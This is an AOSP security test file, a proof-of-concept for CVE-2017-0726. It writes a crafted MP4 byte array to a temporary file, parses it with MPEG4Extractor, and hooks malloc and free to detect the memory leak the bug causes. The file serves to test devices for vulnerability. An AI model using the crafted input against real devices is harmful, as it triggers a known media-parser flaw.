/**
 * Copyright (C) 2020 The Android Open Source Project
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
#include <media/IMediaHTTPService.h>
#include "include/MPEG4Extractor.h"
#include <media/stagefright/MetaData.h>
#include <dlfcn.h>
#include <sys/mman.h>
#include <media/stagefright/DataSource.h>
#include "../includes/common.h"

using namespace android;
#define TOTAL_SIZE   524432
#define DATA_SIZE    144
#define TRACK_SIZE   (TOTAL_SIZE - DATA_SIZE + 16 + 1)
#define TMP_FILE     "/data/local/tmp/temp_cve_2017_0726"
#define MAX_ENTRIES  1024

unsigned char mp4_data[DATA_SIZE] = { 0x00, 0x00, 0x00, 0x1C, 0x66, 0x74, 0x79,
        0x70, 0x6D, 0x70, 0x34, 0x32, 0x00, 0x00, 0x00, 0x00, 0x6D, 0x70, 0x34,
        0x32, 0x64, 0x62, 0x79, 0x31, 0x69, 0x73, 0x6F, 0x6D, 0x00, 0x00, 0x00,
        0x74, 0x6D, 0x6F, 0x6F, 0x76, 0x00, 0x00, 0x00, 0x6C, 0x75, 0x64, 0x74,
        0x61, 0x00, 0x00, 0x00, 0x64, 0x6D, 0x65, 0x74, 0x61, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x58, 0x69, 0x6C, 0x73, 0x74, 0x00, 0x00, 0x00,
        0x50, 0x2D, 0x2D, 0x2D, 0x2D, 0x00, 0x00, 0x00, 0x1C, 0x6D, 0x65, 0x61,
        0x6E, 0x00, 0x00, 0x00, 0x00, 0x63, 0x6F, 0x6D, 0x2E, 0x61, 0x70, 0x70,
        0x6C, 0x65, 0x2E, 0x69, 0x54, 0x75, 0x6E, 0x65, 0x73, 0x00, 0x00, 0x00,
        0x14, 0x6E, 0x61, 0x6D, 0x65, 0x00, 0x00, 0x00, 0x00, 0x69, 0x54, 0x75,
        0x6E, 0x53, 0x4D, 0x50, 0x42, 0x00, 0x08, 0x00, 0x18, 0x64, 0x61, 0x74,
        0x61, 0x33, 0x32, 0x20, 0x34, 0x20, 0x33, 0x20, 0x32, 0x33, 0x32, 0x20,
        0x34, 0x20, 0x33, 0x20, 0x32 };

void check_memleak(void);
bool track_malloc = false;

#define ALLOCATED_STATE      1
#define FREED_STATE          2

typedef struct {
    void* ptr;
    size_t size;
    int status;
    int index;
} allocated_mem_ptr;

static void* (*real_malloc)(unsigned long) = NULL;
static void (*real_free)(void *) = NULL;
static int s_memutils_initialized = 0;
static int index = 0;
static allocated_mem_ptr mem_ptrs[MAX_ENTRIES] = { { 0, 0, 0, 0 } };

void exit_handler(void) {
    remove(TMP_FILE);
    check_memleak();
}

void memutils_init(void) {
    real_malloc = (void *(*)(unsigned long))dlsym(RTLD_NEXT, "malloc");
    if (real_malloc == NULL) {
        return;
    }
    real_free = (void (*)(void *))dlsym(RTLD_NEXT, "free");
    if (real_free == NULL) {
        return;
    }
    atexit(exit_handler);
    s_memutils_initialized = 1;
}

void *malloc(size_t size) {
    void* mem_ptr = NULL;
    if (s_memutils_initialized == 0) {
        memutils_init();
    }
    if (track_malloc == false) {
        return real_malloc(size);
    }
    if (size != TRACK_SIZE) {
        return real_malloc(size);
    }
    if (index >= MAX_ENTRIES) {
        return real_malloc(size);
    }
    mem_ptr = real_malloc(size);
    mem_ptrs[index].ptr = mem_ptr;
    mem_ptrs[index].status = ALLOCATED_STATE;
    mem_ptrs[index].size = size;
    mem_ptrs[index].index = index;
    index++;
    return mem_ptr;
}

void free(void *ptr) {
    if (s_memutils_initialized == 0) {
        memutils_init();
    }
    if (ptr) {
        for (int i = 0; i < MAX_ENTRIES; i++) {
            if (ptr == mem_ptrs[i].ptr) {
                if ((i == mem_ptrs[i].index)
                        && (mem_ptrs[i].status != FREED_STATE)) {
                    real_free(ptr);
                    mem_ptrs[i].status = FREED_STATE;
                    return;
                }
            }
        }
    }
    real_free(ptr);
    return;
}

void check_memleak(void) {
    for (int i = 0; i < MAX_ENTRIES; i++) {
        if (mem_ptrs[i].status == ALLOCATED_STATE) {
            exit (EXIT_VULNERABLE);
        }
    }
    return;
}

int main() {
    FILE* fp = fopen(TMP_FILE, "wb");
    if (!fp) {
        return EXIT_SUCCESS;
    }

    char zero_array[TOTAL_SIZE - DATA_SIZE];
    memset(zero_array, 0, (TOTAL_SIZE - DATA_SIZE) * sizeof(char));

    /* Read mp4 stream */
    fwrite(mp4_data, 1, DATA_SIZE, fp);

    /* Append 0's to create custom PoC */
    fwrite(zero_array, 1, (TOTAL_SIZE - DATA_SIZE), fp);
    fclose(fp);

    sp < DataSource > dataSource = DataSource::CreateFromURI(NULL,
    TMP_FILE);
    if (dataSource == nullptr) {
        return EXIT_SUCCESS;
    }

    MPEG4Extractor *extractor = new MPEG4Extractor(dataSource);
    track_malloc = true;
    extractor->getMetaData();
    track_malloc = false;

    return EXIT_SUCCESS;
}
